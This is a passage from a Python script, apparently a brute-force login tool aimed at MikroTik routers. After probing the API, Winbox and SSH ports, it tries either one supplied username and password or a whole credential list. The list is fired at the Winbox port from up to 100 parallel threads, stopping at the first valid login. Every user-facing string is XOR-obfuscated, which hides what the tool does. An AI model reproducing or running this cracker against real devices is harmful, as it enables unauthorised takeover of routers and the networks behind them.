            if len(parts) == 2 and parts[1].isdigit():
                host = parts[0]
                if api_port is None:
                    api_port = int(parts[1])
        if api_port is None:
            api_port = 8728
        if winbox_ports_to_try is None:
            winbox_ports_to_try = [api_port]
        timeout = args.timeout
        is_winbox = api_port != 8728
        main_open = check_port(host, api_port, timeout)
        ssh_open = check_port(host, args.ssh_port, timeout)
        print(_z('', 90))
        print(_s(_z('7777777a0e3b283d3f2e7a777777', 90), G))
        print(_s(_z('7a7a', 90), D) + _s(_z('2127602127', 90).format(host, api_port), c) + _s(_z('7a7a72212773', 90).format(_z('0d3334383522', 90) if is_winbox else _z('1b0a13', 90)), G))
        print(_s(_z('7a7a0a35282e7a', 90), D) + _s(_z('2127', 90).format(api_port), C) + _s(_z('607a', 90), D) + (_s(_z('352a3f34', 90), G) if main_open else _s(_z('393635293f3e', 90), D)) + _s(_z('7a7a267a7a0909127a6868607a', 90), D) + (_s(_z('352a3f34', 90), G) if ssh_open else _s(_z('393635293f3e', 90), D)))
        if not main_open and (not ssh_open):
            print(_s(_z('5014357a2a35282e7a352a3f34747a19323f39317a130a7a3b343e7a3c33283f2d3b363674', 90), X))
            sys.exit(2)
        print(_z('', 90))
        if args.username is not None and args.password is not None:
            username = args.username
            password = args.password
            print(_z('0f293f28607a7a7a2127', 90).format(username))
            print(_z('0a3b2929607a7a7a2127', 90).format(_z('70', 90) * len(password) if password else _z('723f372a2e2373', 90)))
            print()
            ok = False
            if is_winbox and main_open and (not args.skip_api):
                print(_z('0d33343835227a36353d333460', 90))
                try:
                    success, msg = winbox_login(host, username, password, port=api_port, timeout=timeout)
                except ImportError:
                    msg = _z('3f393e293b7a283f2b2f33283f3e607a2a332a7a3334292e3b36367a3f393e293b', 90)
                    success = False
                print(_z('7a7a2127', 90).format(msg))
                ok = success
            elif not is_winbox and main_open and (not args.skip_api):
                print(_z('08352f2e3f2815097a1b0a137a36353d333460', 90))
                success, msg = check_api_login(host, username, password, port=api_port, timeout=timeout)
                print(_z('7a7a2127', 90).format(msg))
                ok = success
            if not args.skip_ssh and ssh_open:
                print(_z('0909127a36353d333460', 90))
                success, msg = check_ssh_login(host, username, password, port=args.ssh_port, timeout=timeout)
                print(_z('7a7a2127', 90).format(msg))
                if success:
                    ok = True
            if ok:
                print(_z('083f292f362e607a130a7a283f3b39323b38363f7a3b343e7a39283f3e3f342e333b36297a2c3b36333e74', 90))
                if interactive:
                    host = None
                    continue
                sys.exit(0)
            print(_z('083f292f362e607a130a7a283f3b39323b38363f7a382f2e7a36353d33347a3c3b33363f3e74', 90))
            if interactive:
                host = None
                continue
            sys.exit(1)
        pairs, err = load_userpass(args.userpass)
        if err:
            print(_z('1f282835287a283f3b3e33343d7a2127607a2127', 90).format(args.userpass, err))
            if interactive:
                host = None
                continue
            sys.exit(2)
        if not pairs:
            print(_z('14357a39283f3e3f342e333b36297a33347a212774', 90).format(args.userpass))
            if interactive:
                host = None
                continue
            sys.exit(2)
        if not is_winbox:
            print(_z('0f293f280a3b29297a3c33363f7a37353e3f7a2f293f297a0d3334383522747a0f293f7a3235292e602a35282e7a723f743d747a130a60686a686f7374', 90))
            if interactive:
                host = None
                continue
            sys.exit(2)
        if not main_open:
            print(_z('0d33343835227a2a35282e7a393635293f3e747a193b3434352e7a2e28237a39283f3e3f342e333b362974', 90))
            if interactive:
                host = None
                continue
            sys.exit(2)
        try_timeout = min(timeout, 2.5)
        tasks = [(i, username, password, port) for i, (username, password) in enumerate(pairs, 1) for port in winbox_ports_to_try]
        total_tries = len(tasks)
        max_workers = min(100, total_tries)
        print(_s(_z('7777777a19283f3e3f342e333b36297a777777', 90), G))
        n_creds = len(pairs)
        n_ports = len(winbox_ports_to_try)
        print(_s(_z('7a7a', 90), D) + _s(_z('2127', 90).format(n_creds), C) + _s(_z('7a39283f3e3f342e333b3629', 90), D) + _s(_z('7a227a', 90), D) + _s(_z('2127', 90).format(n_ports), C) + _s(_z('7a2a35282e29', 90), D) + _s(_z('7a677a', 90), D) + _s(_z('2127', 90).format(total_tries), Y) + _s(_z('7a3b2e2e3f372a2e297a7221277a393534392f28283f342e73', 90).format(max_workers), D))
        print(_z('', 90))

        def try_one(item):
            i, username, password, port = item
            try:
                success, _ = winbox_login(host, username, password, port=port, timeout=try_timeout)
                return (i, username, password, port, success)
            except ImportError:
                raise
            except Exception:
                return (i, username, password, port, False)
        try:
            from concurrent.futures import ThreadPoolExecutor, as_completed
        except ImportError:
            _valid_found = False
            for i, username, password, port in tasks:
                try:
                    success, _ = winbox_login(host, username, password, port=port, timeout=try_timeout)
                except Exception:
                    success = False
                if success:
                    print_valid_found(host, port, username, password)
                    _valid_found = True
                    break
            if _valid_found:
                if interactive:
                    host = None
                    continue
                os._exit(0)
            print(_z('14357a2c3b36333e7a39283f3e3f342e333b367a3c352f343e74', 90))
            if interactive:
                host = None
                continue
            sys.exit(1)
        _valid_found = False
        _import_err = False
        try:
            with ThreadPoolExecutor(max_workers=max_workers) as ex:
                futures = {ex.submit(try_one, t): t for t in tasks}
                done = 0
                for fut in as_completed(futures):
                    done += 1
                    if done % 100 == 0:
                        _check_pause_and_stop()
                        print(_s(_z('7a7a0a28353d283f2929607a', 90), D) + _s(_z('2127', 90).format(done), c) + _s(_z('7a757a', 90), D) + _s(_z('2127', 90).format(total_tries), C) + _s(_z('7a747474', 90), D))
                    try:
                        i, username, password, port, success = fut.result()
                    except ImportError:
                        print(_s(_z('7a7a3f393e293b7a283f2b2f33283f3e607a2a332a7a3334292e3b36367a3f393e293b', 90), X))
                        _import_err = True
                        break
                    if success:
                        print_valid_found(host, port, username, password)
                        _valid_found = True
                        break
            if _import_err:
                if interactive:
                    host = None
                    continue
                sys.exit(2)
            if _valid_found:
                if interactive:
                    host = None
                    continue
                os._exit(0)
        except KeyboardInterrupt:
            print(_s(_z('50092e352a2a3f3e74', 90), Y))
            sys.exit(130)
        print(_s(_z('7777777a083f292f362e7a777777', 90), G))
        print(_s(_z('7a7a14357a2c3b36333e7a39283f3e3f342e333b367a3c352f343e74', 90), X))
        print(_z('', 90))
        if interactive:
            host = None
            continue
        sys.exit(1)
if __name__ == _z('0505373b33340505', 90):
    main()